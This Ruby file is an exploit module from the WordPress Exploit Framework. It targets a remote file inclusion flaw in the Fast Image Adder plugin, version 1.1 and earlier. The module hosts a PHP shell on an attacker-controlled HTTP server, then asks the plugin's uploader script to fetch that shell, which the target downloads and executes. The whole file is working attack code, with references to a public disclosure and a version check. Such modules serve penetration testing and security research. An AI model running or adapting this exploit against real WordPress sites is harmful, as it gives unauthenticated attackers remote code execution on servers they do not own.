# frozen_string_literal: true

require 'erb'

class Wpxf::Exploit::FastImageAdderV11RfiShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpServer
  include Wpxf::WordPress::ShellUpload
  include ERB::Util

  def initialize
    super

    update_info(
      name: 'Fast Image Adder <= 1.1 RFI Shell Upload',
      desc: %(
        Fast Image Adder <= 1.1 suffers from a remote file inclusion vulnerability
        which allows unauthenticated users to download and execute a PHP shell
        hosted on a remote server.

        This module will host a HTTP server to serve the payload, and make a request
        to the target that will initiate the download and execution of the payload.
      ),
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8092'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=139']
      ],
      date: 'Jul 10 2015'
    )

    register_options([
      StringOption.new(
        name: 'rfi_host',
        desc: 'The address of the host listening for a connection',
        required: true
      ),
      StringOption.new(
        name: 'rfi_path',
        desc: 'The path to access via the remote file inclusion request',
        default: Utility::Text.rand_alpha(8),
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('fast-image-adder', '1.2')
  end

  def rfi_host
    normalized_option_value('rfi_host')
  end

  def rfi_path
    normalized_option_value('rfi_path')
  end

  def rfi_url
    "http://#{rfi_host}:#{http_server_bind_port}/#{rfi_path}/#{payload_name}"
  end

  def on_http_request(_path, _params, _headers)
    payload.encoded
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'fast-image-adder', "fast-image-adder-uploader.php?confirm=url&url=#{url_encode(rfi_url)}")
  end

  def uploaded_payload_location
    upload_result.body[/Uploaded as (.+?)\s/i, 1]
  end

  def payload_body_builder
    Utility::BodyBuilder.new
  end

  def execute_payload(url)
    stop_http_server
    super(url)
  end

  def run
    start_http_server true
    super
  end
end
